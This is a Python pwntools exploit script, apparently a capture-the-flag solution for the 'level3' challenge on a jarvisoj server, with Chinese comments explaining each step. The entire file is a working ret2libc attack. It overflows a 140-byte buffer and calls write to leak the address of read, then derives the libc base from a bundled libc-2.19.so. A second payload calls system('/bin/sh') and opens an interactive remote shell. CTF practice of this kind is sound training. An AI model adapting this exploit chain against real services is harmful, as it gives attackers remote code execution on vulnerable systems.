#!/usr/bin/env python
# coding=utf-8

from pwn import *
from LibcSearcher import *
nc='pwn2.jarvisoj.com'
point = 9879
#p = process('./level3')
#p = remote("localhost", 12345)
p = remote(nc,point)
#junk = "A"*0x8c
payload = "A"*140 + p32(0x08048340) + p32(0x08048484)+ p32(1) + p32(0x0804A00C)+ p32(4) #构造write函数泄露read地址
#          溢出长度   jump write函数		main函数				read 地址
#payload = ''
#payload+=junk
#payload+=p32(0x08048320)+p32(0x08048320)+p32(addr1)
p.send(payload)
p.recvline()
#print(hex(u32(p.recv()[:4])))
v = p.recv()
print v
addr=(u32(v[:4]))
#回显 read 地址
libc = ELF('./libc-2.19.so')
#libc=LibcSearcher("read", addr)
libc_base = addr - libc.symbols['read']
#libc base 基址 = read地址- read 偏移地址
print hex(libc_base)
print hex(addr)
system_addr = libc_base + libc.symbols['system']
#system地址= libc基址 + system偏移地址
binsh_addr = libc_base + libc.search('/bin/sh\x00').next()
#bin地址= libc基址 + bin偏移地址
print hex(binsh_addr)
payload = flat(['A' * 140, system_addr, 0xdeadbeef, binsh_addr])
p.sendline(payload)
p.interactive()
